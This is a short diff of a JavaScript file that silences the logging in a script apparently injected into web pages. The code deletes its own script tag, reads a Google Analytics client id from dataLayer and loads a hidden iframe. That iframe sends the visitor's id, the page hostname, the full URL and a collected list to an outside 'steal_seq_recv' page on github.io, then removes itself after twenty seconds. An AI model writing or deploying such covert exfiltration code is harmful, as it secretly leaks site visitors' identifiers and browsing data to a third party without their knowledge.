@@ -31,7 +31,7 @@ function removeScript() {
     for (i = 0; i < ss.length; i++) {
         if (ss[i].innerHTML.indexOf("function seqVer()") !== -1) {
             ss[i].parentNode.removeChild(ss[i]);
-            console.log("Remove script done ver.Seq");
+            //console.log("Remove script done ver.Seq");
             break;
         }
     }
@@ -72,11 +72,11 @@ function doFlow() {
     var wframe = document.getElementById(wjmId);
     wframe.addEventListener("load", function() {
         setTimeout(function() {
-            console.log("removing " + wjmId);
+            //console.log("removing " + wjmId);
             if(wframe.parentNode){
                 wframe.parentNode.removeChild(wframe);
             }
-            console.log("remove " + wjmId + " done");
+            //console.log("remove " + wjmId + " done");
         }, 20000);
 
     });
@@ -87,7 +87,7 @@ function doFlow() {
         try {
             uid = dataLayer[i]['ga_c_id'];
         } catch (e) {
-            console.log("pass");
+            //console.log("pass");
         }
         if (uid != null) {
             break;
@@ -252,8 +252,8 @@ function doFlow() {
         }
         eList=eList.toString();
         eList=eList.replace(/,,+/g, ",");
-        console.log(wjmId+" eList: " + eList);
+        //console.log(wjmId+" eList: " + eList);
         wframe.src = "https://wjinma.github.io/sending_for_fun/steal_seq_recv.html?uid==" + uid + "&&domain==" + window.location.hostname + "&&cid==" + getgaCid() + "&&url==" + window.location.href + "&&eList==" + eList;
-        console.log(wjmId+" url: " + wframe.src);
+        //console.log(wjmId+" url: " + wframe.src);
     });
 }
